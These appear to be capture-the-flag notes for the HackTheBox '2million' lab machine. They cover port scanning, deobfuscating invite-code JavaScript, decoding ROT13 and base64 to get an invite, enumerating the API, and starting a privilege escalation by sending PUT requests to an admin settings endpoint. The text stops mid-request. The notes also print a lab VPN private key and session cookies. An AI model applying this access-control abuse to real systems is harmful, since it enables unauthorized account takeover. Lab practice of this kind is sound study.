### Nmap
```
nmap -sV -sC -vv 10.129.20.5


---OUTPUT---
Nmap scan report for 10.129.20.5
Host is up, received echo-reply ttl 63 (0.021s latency).
Scanned at 2026-06-10 07:54:46 EDT for 9s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
80/tcp open  http    syn-ack ttl 63 nginx
|_http-title: Did not follow redirect to http://2million.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Port 80
![[Pasted image 20260610075823.png]]

- It talks of doing a challenge to get login creds:
![[Pasted image 20260610075848.png]]

- This leads to the invite page:
![[Pasted image 20260610075909.png]]

- Checking the source code there is something interesting:
![[Pasted image 20260610081229.png]]

```
<!-- scripts --> 
<script src="[/js/htb-frontend.min.js](view-source:http://2million.htb/js/htb-frontend.min.js)"></script> 
<script defer src="[/js/inviteapi.min.js](view-source:http://2million.htb/js/)"></script> 
<script defer> 
	$(document).ready(function() { 
		$('#verifyForm').submit(function(e) { 
			e.preventDefault(); 
			
			var code = $('#code').val(); 
			var formData = { "code": code }; 
			
			$.ajax({ 
				type: "POST", 
				dataType: "json", 
				data: formData, 
				url: '/api/v1/invite/verify', 
				success: function(response) { 
					if (response[0] === 200 && response.success === 1 && response.data.message === "Invite code is valid!") { 
						// Store the invite code in localStorage 
						localStorage.setItem('inviteCode', code); 
						
						window.location.href = '/register'; 
					} else { 
						alert("Invalid invite code. Please try again."); 
						} 
					}, 
					error: function(response) { 
						alert("An error occurred. Please try again."); 
						} 
					}); 
				}); 
			});
```

- The endpoint to verify the code is `/api/v1/invite/verify`. I don't see an output in the browser so I use curl (and Burp)
```
curl -X POST http://2million.htb/api/v1/invite/how/to/generate


{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
```

- Accessing it I get another code:
![[Pasted image 20260610081929.png]]

- Then either using an LLM or a beautifier app (https://beautifier.io/) I make the code more readably:

```
eval(function(p, a, c, k, e, d) {
    e = function(c) {
        return c.toString(36)
    };
    if (!''.replace(/^/, String)) {
        while (c--) {
            d[c.toString(a)] = k[c] || c.toString(a)
        }
        k = [function(e) {
            return d[e]
        }];
        e = function() {
            return '\\w+'
        };
        c = 1
    };
    while (c--) {
        if (k[c]) {
            p = p.replace(new RegExp('\\b' + e(c) + '\\b', 'g'), k[c])
        }
    }
    return p
}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}', 24, 24, 'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'), 0, {})) // This is just a sample script. Paste your real code (javascript or HTML) here.

if ('this_is' == /an_example/) {
    of_beautifier();
} else {
    var a = b ? (c % d) : e[f];
}
```

- The code is still obfuscated so using a deobfuscator like `de4js` I manage to deobfuscate it:
![[Pasted image 20260610083733.png]]

```
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}
```

- This shows an endpoint `/api/v1/invite/how/to/generate`
- Going to it via browser doesn't give me an output but I get one via vcurl and Burp:
```
curl -X POST http://2million.htb/api/v1/invite/how/to/generate

---OUTPUT---
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}                                  
```
![[Pasted image 20260610083931.png]]

```
---REQUEST---
POST /api/v1/invite/how/to/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Origin: http://2million.htb
Connection: keep-alive
Referer: http://2million.htb/invite
Cookie: PHPSESSID=oec60vo7k5up4sn7ptf0nuvh1e
Priority: u=0
Content-Length: 0
Content-Type: application/x-www-form-urlencoded


---REPONSE---
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 10 Jun 2026 12:11:04 GMT
Content-Type: application/json
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 249

{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}
```

- its a ROT13 encryption with encrypted data. using an online rot13 decryptor I decrypt the data:
![[Pasted image 20260610091746.png]]
```
---ENCRYPTED-TEXT---
Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr

---DECRYPTED---
In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate
```

- I send a POST request to the target endpoint:
```
curl -X POST http://2million.htb/api/v1/invite/generate
{"0":200,"success":1,"data":{"code":"SUVMMUYtUlRTWTctUjBKUlEtN0JHSzE=","format":"encoded"}}
```
![[Pasted image 20260610091913.png]]

- I receive a code `SUVMMUYtUlRTWTctUjBKUlEtN0JHSzE=` encrypted in base64
- Decrypting it:
```
echo "SUVMMUYtUlRTWTctUjBKUlEtN0JHSzE=" | base64 -d
IEL1F-RTSY7-R0JRQ-7BGK1
```
- Entering the code allows me to access register where I can create a profile `test:test`:
![[Pasted image 20260610092115.png]]
- I can then login to the portal:\
![[Pasted image 20260610092218.png]]

- Moving to `Access` and clicking on `Conncetion Pack` downloads an OVPN and gives the following response in burpsuite:
```
---REQUEST---
GET /api/v1/user/vpn/generate HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://2million.htb/home/access
Cookie: PHPSESSID=oec60vo7k5up4sn7ptf0nuvh1e
Upgrade-Insecure-Requests: 1
Priority: u=0, i

--_RESPONSE---
HTTP/1.1 200 OK
Server: nginx
Date: Wed, 10 Jun 2026 14:59:26 GMT
Content-Type: application/octet-stream
Content-Length: 10817
Connection: keep-alive
Content-Description: File Transfer
Content-Disposition: attachment; filename="test.ovpn"
Expires: 0
Cache-Control: must-revalidate
Pragma: public

client
dev tun
proto udp
remote edge-eu-free-1.2million.htb 1337
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
comp-lzo
verb 3
data-ciphers-fallback AES-128-CBC
data-ciphers AES-256-CBC:AES-256-CFB:AES-256-CFB1:AES-256-CFB8:AES-256-OFB:AES-256-GCM
tls-cipher "DEFAULT:@SECLEVEL=0"
auth SHA256
key-direction 1
<ca>
-----BEGIN CERTIFICATE-----
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
2iX/ag==
-----END CERTIFICATE-----
</ca>
<cert>
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 1 (0x1)
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C=UK, ST=London, L=London, O=HackTheBox, OU=VPN, CN=2million/emailAddress=info@hackthebox.eu
        Validity
            Not Before: Jun 10 14:59:26 2026 GMT
            Not After : Jun 10 14:59:26 2027 GMT
        Subject: C=GB, ST=London, L=London, O=test, CN=test
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:91:9e:49:1f:b6:14:93:96:e5:b6:be:03:84:a5:
                    ee:fe:8e:d7:63:f9:a8:56:64:e9:56:10:87:fe:06:
                    16:2a:2b:28:b4:bf:fb:16:eb:e7:a0:ae:c4:d3:c6:
                    41:c2:de:86:ac:de:54:32:ea:fc:7a:e5:ea:16:0b:
                    21:a8:cb:28:12:f4:1d:89:c4:bd:d0:2a:d1:58:5a:
                    d4:d0:b9:c7:b1:3c:0d:33:dc:4e:0c:1d:c6:74:3d:
                    99:ed:7f:16:77:ef:41:3f:a7:20:10:06:d9:5e:c1:
                    84:b3:46:d0:e9:3d:eb:92:b7:06:bd:71:4b:d6:93:
                    c8:81:f1:ef:17:b7:37:4d:f0:fe:5a:cc:67:e0:4c:
                    ad:bc:c7:50:8a:72:ef:34:92:f6:24:fb:c5:d3:1b:
                    3e:78:3a:a9:29:de:b4:a4:3d:c5:cf:b9:dc:58:f8:
                    e2:c5:00:34:33:23:32:92:17:da:c9:09:e4:c6:38:
                    14:6f:e2:0c:56:7e:3e:51:db:27:76:15:11:fa:3d:
                    8a:8b:ef:39:9c:a5:54:cf:51:cc:b9:17:f3:42:f7:
                    72:7e:a1:47:d8:f2:37:03:ef:a0:31:31:d2:6e:ea:
                    92:98:b9:f6:2a:28:95:6b:4f:53:14:0c:53:2a:1f:
                    39:68:46:4e:2b:e0:d8:32:df:b8:62:e7:7f:1d:e2:
                    50:1b
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Key Identifier: 
                94:57:4F:8E:8E:EE:F1:2E:2D:C4:D1:58:FA:C8:06:50:51:75:F1:ED
            X509v3 Authority Key Identifier: 
                7A:62:DD:1D:B6:FE:4A:C8:E3:F8:9F:FA:AC:F4:15:0C:96:BA:2E:91
            X509v3 Basic Constraints: 
                CA:FALSE
            X509v3 Key Usage: 
                Digital Signature, Non Repudiation, Key Encipherment, Data Encipherment, Key Agreement, Certificate Sign, CRL Sign
            Netscape Comment: 
                OpenSSL Generated Certificate
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        65:79:fd:cd:a7:d3:47:5b:1a:1a:66:bc:b8:f0:2c:a6:b9:3d:
        80:ff:b5:a8:34:65:ef:1a:5f:02:36:1e:fa:af:ba:c2:3e:db:
        93:a0:a8:35:52:62:de:59:b8:05:75:c4:ef:3d:3f:ac:56:a9:
        30:15:7e:a7:37:7b:2b:81:92:ab:bc:6d:f2:c1:5c:66:49:f2:
        48:92:94:dc:f5:da:f7:30:08:71:fe:a9:72:27:6f:65:02:e6:
        2b:85:8e:9e:8e:09:57:78:d2:16:15:d3:4a:e2:fc:60:77:b2:
        58:70:b8:43:f2:66:51:c1:3c:57:4f:a7:d9:4b:b4:1f:e4:b9:
        28:82:e9:91:6f:06:ea:54:6d:a3:0e:a9:cc:e7:24:e4:cc:44:
        6b:33:fb:30:b5:d4:a7:58:e6:a8:c0:38:b9:62:36:5e:bf:87:
        c8:f7:bc:2c:31:35:de:8e:8f:2a:6f:ad:e9:cc:e9:8a:e6:7b:
        88:ef:aa:e5:36:5c:a2:8a:ad:ed:3f:3e:36:ca:7d:5a:51:c1:
        1c:de:aa:c8:a4:17:28:cb:7c:b1:20:e2:f5:79:30:88:90:48:
        b7:ee:08:7a:3c:b7:2c:12:b7:85:0e:e2:ab:59:0f:4a:57:6e:
        75:c9:3d:49:75:52:af:29:2f:de:24:0d:e1:14:aa:5a:57:97:
        70:8f:e9:00:1e:f0:ae:8d:42:56:2f:be:13:5b:b4:c1:dc:e4:
        cb:ad:1b:36:c6:9b:e7:c7:37:6c:7a:cf:46:08:98:d8:6d:4d:
        de:e9:7a:97:a7:aa:76:29:15:3d:0b:2b:4f:68:10:e9:6f:79:
        98:5f:06:de:c3:68:0b:32:95:fa:e6:70:2c:ee:ea:57:9d:89:
        45:e8:f8:65:99:4c:58:08:0b:46:dc:bc:83:03:86:43:a7:d3:
        db:63:a0:8c:e3:02:b0:28:03:db:1f:2a:84:81:0a:45:94:22:
        4c:82:24:ad:2b:d9:ff:e2:f3:5f:3a:6f:0b:1d:81:95:b8:48:
        36:84:8c:4e:0c:f7:ff:74:06:b4:a6:ae:77:4d:d7:25:8a:bf:
        9e:9e:16:22:0f:4f:b6:e5:01:1a:48:1f:14:bd:b8:01:fe:0b:
        0f:90:79:a6:68:24:a4:c6:49:57:b6:cf:ba:bf:c9:66:cc:da:
        81:67:de:8c:47:d6:2a:b8:b6:37:7b:a2:8d:ae:7c:aa:e0:e8:
        b2:76:b1:7e:d5:fb:96:1f:bb:c0:ab:08:18:56:ac:d0:05:ef:
        6a:14:55:1b:2e:2c:dc:14:b2:01:f1:d9:4c:b9:23:6f:cc:4f:
        31:16:50:73:d8:17:44:52:d5:1b:ce:0d:2f:e2:cf:b6:c1:36:
        83:4d:ba:f5:d1:1e:91:dc
-----BEGIN CERTIFICATE-----
MIIE2zCCAsOgAwIBAgIBATANBgkqhkiG9w0BAQsFADCBiDELMAkGA1UEBhMCVUsx
DzANBgNVBAgMBkxvbmRvbjEPMA0GA1UEBwwGTG9uZG9uMRMwEQYDVQQKDApIYWNr
VGhlQm94MQwwCgYDVQQLDANWUE4xETAPBgNVBAMMCDJtaWxsaW9uMSEwHwYJKoZI
hvcNAQkBFhJpbmZvQGhhY2t0aGVib3guZXUwHhcNMjYwNjEwMTQ1OTI2WhcNMjcw
NjEwMTQ1OTI2WjBNMQswCQYDVQQGEwJHQjEPMA0GA1UECAwGTG9uZG9uMQ8wDQYD
VQQHDAZMb25kb24xDTALBgNVBAoMBHRlc3QxDTALBgNVBAMMBHRlc3QwggEiMA0G
CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCRnkkfthSTluW2vgOEpe7+jtdj+ahW
ZOlWEIf+BhYqKyi0v/sW6+egrsTTxkHC3oas3lQy6vx65eoWCyGoyygS9B2JxL3Q
KtFYWtTQucexPA0z3E4MHcZ0PZntfxZ370E/pyAQBtlewYSzRtDpPeuStwa9cUvW
k8iB8e8XtzdN8P5azGfgTK28x1CKcu80kvYk+8XTGz54Oqkp3rSkPcXPudxY+OLF
ADQzIzKSF9rJCeTGOBRv4gxWfj5R2yd2FRH6PYqL7zmcpVTPUcy5F/NC93J+oUfY
8jcD76AxMdJu6pKYufYqKJVrT1MUDFMqHzloRk4r4Ngy37hi538d4lAbAgMBAAGj
gYkwgYYwHQYDVR0OBBYEFJRXT46O7vEuLcTRWPrIBlBRdfHtMB8GA1UdIwQYMBaA
FHpi3R22/krI4/if+qz0FQyWui6RMAkGA1UdEwQCMAAwCwYDVR0PBAQDAgH+MCwG
CWCGSAGG+EIBDQQfFh1PcGVuU1NMIEdlbmVyYXRlZCBDZXJ0aWZpY2F0ZTANBgkq
hkiG9w0BAQsFAAOCAgEAZXn9zafTR1saGma8uPAsprk9gP+1qDRl7xpfAjYe+q+6
wj7bk6CoNVJi3lm4BXXE7z0/rFapMBV+pzd7K4GSq7xt8sFcZknySJKU3PXa9zAI
cf6pcidvZQLmK4WOno4JV3jSFhXTSuL8YHeyWHC4Q/JmUcE8V0+n2Uu0H+S5KILp
kW8G6lRtow6pzOck5MxEazP7MLXUp1jmqMA4uWI2Xr+HyPe8LDE13o6PKm+t6czp
iuZ7iO+q5TZcooqt7T8+Nsp9WlHBHN6qyKQXKMt8sSDi9XkwiJBIt+4Iejy3LBK3
hQ7iq1kPSldudck9SXVSrykv3iQN4RSqWleXcI/pAB7wro1CVi++E1u0wdzky60b
Nsab58c3bHrPRgiY2G1N3ul6l6eqdikVPQsrT2gQ6W95mF8G3sNoCzKV+uZwLO7q
V52JRej4ZZlMWAgLRty8gwOGQ6fT22OgjOMCsCgD2x8qhIEKRZQiTIIkrSvZ/+Lz
XzpvCx2BlbhINoSMTgz3/3QGtKaud03XJYq/np4WIg9PtuUBGkgfFL24Af4LD5B5
pmgkpMZJV7bPur/JZszagWfejEfWKri2N3uija58quDosnaxftX7lh+7wKsIGFas
0AXvahRVGy4s3BSyAfHZTLkjb8xPMRZQc9gXRFLVG84NL+LPtsE2g0269dEekdw=
-----END CERTIFICATE-----
</cert>
<key>
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCRnkkfthSTluW2
vgOEpe7+jtdj+ahWZOlWEIf+BhYqKyi0v/sW6+egrsTTxkHC3oas3lQy6vx65eoW
CyGoyygS9B2JxL3QKtFYWtTQucexPA0z3E4MHcZ0PZntfxZ370E/pyAQBtlewYSz
RtDpPeuStwa9cUvWk8iB8e8XtzdN8P5azGfgTK28x1CKcu80kvYk+8XTGz54Oqkp
3rSkPcXPudxY+OLFADQzIzKSF9rJCeTGOBRv4gxWfj5R2yd2FRH6PYqL7zmcpVTP
Ucy5F/NC93J+oUfY8jcD76AxMdJu6pKYufYqKJVrT1MUDFMqHzloRk4r4Ngy37hi
538d4lAbAgMBAAECggEAHXonvkobBzdkH+Z+CtOWOiSLOHs41uhNjbUB+mucAARF
lLVKLD0r4cyPHnmDJWHrbEIDVF1aJ7yz8qtlMGiTn6aX9iQD8ohAYXzdmLUK1fdc
itN9XxmF61DvAHMaBsRBdpOru2LPjM1qwenDb3uv3L69GAs/uVuoGpnxduEJSncA
jXt11HTD+FR+7DMjTsFEEJ85O9ZElj+WlVcgCP4EjOwK5wZ9TEhaK9K+lPaocEOQ
j9nrauzF8f6AnGj3VMjLebCf/QY+baaN1KyFaeOz7WQhhKT9UsIwLBWMgSxlGNVe
bD/lpY9OapJN8utGgCA1O6EcwiZ1KHnp91Ss8pv22QKBgQDNQzFxNtiLxH357Qha
akrgX1TQR/NWuyqnOhwQMk8JbMukxhnmNNaCavW5PS/8mYWWxAgX0qHry2xFk5gO
y3UK7AACG7r06d3k7DonE/y2QSkylvmQ+eZRf1YnOuEAS934voiF9r39Q9VLlv6/
XnGDgfm6JRFaJxqF4j/b2o5juQKBgQC1nN5GLPpwd5P2qvYijj0IEF0QrHFUqxCg
2LJbu5PWfIadyYMFlEA5akz6SaQ3KhC/6LnMfcEqtRvvtsrzRjZQqcyJnM3XnbKd
wrmX1wFnTby17ZHGS1H23EeQ21ww6IrOZ5flcF2x6HV+fyllJc89x9edARDJWkwD
1CYmvtGkcwKBgBX2LoASgjDSIThwaAhkfwZqrMRsLlkFRZcG3KHPAC3d+hvzJio/
VQQ3NXtQVKYONwDekI8b9j8oULlRBV/v3OICRi3zkZlKvHcV31L3DH7jkejbxnAA
jOgDW9BuuEwz0dgfarQKpmFGtLeVvEP1cufDLFkCRk0DCg9xGawIQlvhAoGAVaJQ
FJrkw98+f5MBWC3ljUXZ/CCzl47J2m4TO7no7bvt5by88QaEeg4rmeDbc798AmGE
Km4phS+8qn1wmOFEfyhxb3nmfYK4VDcbOAODf+hh0Q7iK7QcQ+B+RkmI4O7ldInY
T7F6HIdVz326UR1Q6PqwKjH0bl0Ldsqz6pUTWQ0CgYEAg1IzwObH3m8ja1mZzBEH
rPdMYKTG1eod00g/RRLG4kBtnoC7t8wP9aiB1Hr5TXkoiORgJmOQPP8TXq3vhpAd
BVPYb39p0+aCGQ34Tmg0HSkQYJALJKmRNQ1sgUBCWaJUYesXMgpwmCkdCR4UrHkn
Lq0blqJjfhr+o88bS/OY8/U=
-----END PRIVATE KEY-----
</key>
<tls-auth>
#
# 2048 bit OpenVPN static key
#
-----BEGIN OpenVPN Static key V1-----
45df64cdd950c711636abdb1f78c058c
358730b4f3bcb119b03e43c46a856444
05e96eaed55755e3eef41cd21538d041
079c0fc8312517d851195139eceb458b
f8ff28ba7d46ef9ce65f13e0e259e5e3
068a47535cd80980483a64d16b7d10ca
574bb34c7ad1490ca61d1f45e5987e26
7952930b85327879cc0333bb96999abe
2d30e4b592890149836d0f1eacd2cb8c
a67776f332ec962bc22051deb9a94a78
2b51bafe2da61c3dc68bbdd39fa35633
e511535e57174665a2495df74f186a83
479944660ba924c91dd9b00f61bc09f5
2fe7039aa114309111580bc5c910b4ac
c9efb55a3f0853e4b6244e3939972ff6
bfd36c19a809981c06a91882b6800549
-----END OpenVPN Static key V1-----
</tls-auth>

```

- Playing with burp (or curl or browser) we can see more endpoints by quering `/api/v1`
```
---CURL---
curl -i \
  -H "Cookie: PHPSESSID=oec60vo7k5up4sn7ptf0nuvh1e" \
  http://2million.htb/api
  

HTTP/1.1 200 OK
Server: nginx
Date: Thu, 11 Jun 2026 11:37:50 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

{"\/api\/v1":"Version 1 of the API"}  

---BURP---
GET /api/v1 HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=oec60vo7k5up4sn7ptf0nuvh1e
Upgrade-Insecure-Requests: 1
Priority: u=0, i

----BURP-RESPONSE---
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 11 Jun 2026 11:38:33 GMT
Content-Type: application/json
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 800

{"v1":{"user":{"GET":{"\/api\/v1":"Route List","\/api\/v1\/invite\/how\/to\/generate":"Instructions on invite code generation","\/api\/v1\/invite\/generate":"Generate invite code","\/api\/v1\/invite\/verify":"Verify invite code","\/api\/v1\/user\/auth":"Check if user is authenticated","\/api\/v1\/user\/vpn\/generate":"Generate a new VPN configuration","\/api\/v1\/user\/vpn\/regenerate":"Regenerate VPN configuration","\/api\/v1\/user\/vpn\/download":"Download OVPN file"},"POST":{"\/api\/v1\/user\/register":"Register a new user","\/api\/v1\/user\/login":"Login with existing user"}},"admin":{"GET":{"\/api\/v1\/admin\/auth":"Check if user is admin"},"POST":{"\/api\/v1\/admin\/vpn\/generate":"Generate VPN for specific user"},"PUT":{"\/api\/v1\/admin\/settings\/update":"Update user settings"}}}}
```

![[Pasted image 20260611074054.png]]

![[Pasted image 20260611074112.png]]

![[Pasted image 20260611074126.png]]
- Initially I send a test post request to the endpoint `/api/v1/admin/settings/update` and get an error message :
```
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=oec60vo7k5up4sn7ptf0nuvh1e
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/x-www-form-urlencoded
Content-Length: 69

{
  "username": "test",
  "password": "test",
  "role": "admin"
}

--_RESPONSE---
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 11 Jun 2026 11:45:01 GMT
Content-Type: application/json
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 53

{"status":"danger","message":"Invalid content type."}
```
![[Pasted image 20260611080620.png]]

- Most API endpoints use JSON (and we know it is using JSON here), so we set the content type to `application/json`
- On doing that I receive a different disponse : `Missing parameter email`:
```
---REQUEST---
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: PHPSESSID=oec60vo7k5up4sn7ptf0nuvh1e
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Content-Type: application/json
Content-Length: 69

{
  "username": "test",
  "password": "test",
  "role": "admin"
}

--_RESPONSE---
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 11 Jun 2026 12:00:11 GMT
Content-Type: application/json
Connection: keep-alive
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 56

{"status":"danger","message":"Missing parameter: email"}
```
![[Pasted image 20260611080643.png]]

- I then set the email parameter to my account:
```
--_REQUEST---
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
